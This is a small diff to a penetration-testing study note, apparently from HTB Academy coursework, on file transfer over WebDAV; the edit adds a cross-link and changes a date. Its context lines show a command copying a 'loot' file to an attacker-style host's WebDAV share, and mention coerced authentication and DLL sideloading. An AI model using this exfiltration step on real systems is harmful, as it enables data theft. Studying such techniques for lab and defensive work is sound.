@@ -33,10 +33,10 @@ copy C:\loot\file.txt \\10.10.14.5\DavWWWRoot\
 
 > [!tip] Because the share is reachable by UNC path, it also works as the target for coerced-authentication and DLL-sideloading paths where a UNC is accepted but SMB is filtered.
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] — SMB-style transfers over HTTP when 445 is blocked; SMB counterpart is [[Tools/File Transfer/SMBserver|impacket-smbserver]].
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] — SMB-style transfers over HTTP when 445 is blocked; SMB counterpart is [[Tools/File Transfer/SMBserver|impacket-smbserver]]. Plain HTTP-serving counterpart: [[Tools/File Transfer/python-http-server|python-http-server]].
 
 ---
 
 *Created: 2026-07-30*
-*Updated: 2026-07-30*
+*Updated: 2026-08-28*
 *Model: claude-opus-5*
